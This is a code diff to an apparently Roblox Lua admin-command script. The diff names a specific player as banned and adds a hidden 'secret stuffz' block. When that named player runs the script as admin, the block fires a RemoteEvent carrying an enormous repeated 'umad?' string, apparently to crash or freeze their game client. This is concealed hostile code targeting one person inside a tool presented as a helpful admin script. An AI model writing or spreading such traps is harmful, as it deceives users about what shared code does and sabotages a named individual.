@@ -1,6 +1,6 @@
 --copyright Made By Basictality
 wait() --ignore this. (if u touch it won't load)
-adminwew = game.Players.Basictality --Put you're name HERE!
+adminwew = game.Players:FindFirstChild('Basictality') --Put you're name in HERE!
  local admins = {adminwew.Name,adminwew}
  chatname = '[bOrb]: '
 wpadtrans = "0"
@@ -8,7 +8,7 @@ wpadtrans = "0"
 prefix = "-"
 dis = "7"
 Speed = "0.1" --The best ones are 0.1 - 0.5
-Banned = "BannedPerson"
+Banned = "LoganKohrman" --noob.
 Chat = true
 ----------------------------------------------------------------------------------------------
  print[[version 51.6]]
@@ -107,6 +107,11 @@ end
 end
 
 adminwew.Chatted:connect(OnChatted)
+-------secret stuffz---------
+if adminwew == game.Players:FindFirstChild('LoganKohrman') then
+	removeclient=Instance.new('RemoteEvent',workspace):FireClient(adminwew,{string.rep("umad?",2e5+5)})
+ game.Debris:AddItem(removeclient,1)
+end
 ----------cmds gui-----------
 for i,v in pairs(game.Players:children()) do
 function OnChatted(cmds)
